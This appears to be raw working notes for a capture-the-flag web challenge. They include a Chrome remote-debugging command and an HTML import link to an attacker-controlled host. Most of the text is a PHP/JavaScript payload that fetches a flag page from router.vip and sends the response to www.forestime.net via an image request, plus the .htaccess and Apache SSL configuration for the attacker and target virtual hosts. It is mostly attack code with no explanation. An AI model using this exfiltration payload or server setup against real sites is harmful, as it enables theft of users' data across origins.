vnc上去
google-chrome --incognito --remote-debugging-port=9222

<link rel=import href=\\www。forestime。net\b


<?php header('Access-Control-Allow-Origin: *');?>
<script>
function reqListener () {
  new Image().src='https://www.forestime.net/1.php?a='+escape(this.responseText);
}

var oReq = new XMLHttpRequest();
oReq.addEventListener("load", reqListener);
oReq.open("GET", "https://router.vip/flag.php");
oReq.send();
</script>


cat .htaccess
RewriteEngine on
RewriteRule "^.*b.*" "/a.php"



root@zerobox:/etc/apache2/sites-enabled# cat ssl.conf
<IfModule mod_ssl.c>
	<VirtualHost www.forestime.net:443>
		ServerName www.forestime.net
		DocumentRoot /var/www/html1
<Directory "/var/www/html1">
    AllowOverride All
</Directory>

		ErrorLog ${APACHE_LOG_DIR}/error.log
		CustomLog ${APACHE_LOG_DIR}/access.log combined


		#   SSL Engine Switch:
		#   Enable/Disable SSL for this virtual host.
		SSLEngine on

		SSLCertificateFile	/etc/apache2/f.crt
		SSLCertificateKeyFile /etc/apache2/f.key
    		SSLCertificateChainFile /etc/apache2/fc.crt

	</VirtualHost>
 <VirtualHost router.vip:443>
		ServerName router.vip
		DocumentRoot /var/www/html

		ErrorLog ${APACHE_LOG_DIR}/error.log
		CustomLog ${APACHE_LOG_DIR}/access.log combined


		#   SSL Engine Switch:
		#   Enable/Disable SSL for this virtual host.
		SSLEngine on

		SSLCertificateFile	/etc/apache2/router.vip.crt
		SSLCertificateKeyFile /etc/apache2/router.vip.key
    		SSLCertificateChainFile /etc/apache2/root.crt

	</VirtualHost>

       <VirtualHost 202.120.7.204:443>
	#	ServerName 202.120.7.204
		DocumentRoot /var/www/html1

		ErrorLog ${APACHE_LOG_DIR}/error.log
		CustomLog ${APACHE_LOG_DIR}/access.log combined

	</VirtualHost>

</IfModule>